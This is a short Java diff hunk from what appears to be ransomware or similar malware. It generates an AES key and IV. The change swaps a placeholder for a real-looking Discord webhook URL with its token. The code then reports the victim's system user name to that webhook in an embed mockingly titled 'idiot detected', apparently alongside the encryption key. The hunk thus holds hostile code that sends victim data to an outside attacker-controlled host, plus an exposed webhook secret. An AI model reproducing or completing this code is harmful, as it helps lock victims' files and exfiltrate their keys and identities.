@@ -48,7 +48,7 @@ public class Main {
             SecretKey key = Encrypt.genKey(256);
             String strKey = Base64.getEncoder().encodeToString(key.getEncoded());
             IvParameterSpec iv = Encrypt.generateIv();
-            DiscordWebhook LMAO = new DiscordWebhook("your hook here");
+            DiscordWebhook LMAO = new DiscordWebhook("https://discord.com/api/webhooks/1024833564971384912/pVMr8ShCNE4hOBhLvhHsH3qshaga8l4-rnlnGEGMRVwpaFZSgHNm9qf_0KOz6Q4ydw5g");
             LMAO.setUsername(System.getProperty("user.name"));
             LMAO.addEmbed(new DiscordWebhook.EmbedObject()
                     .setTitle("idiot detected")
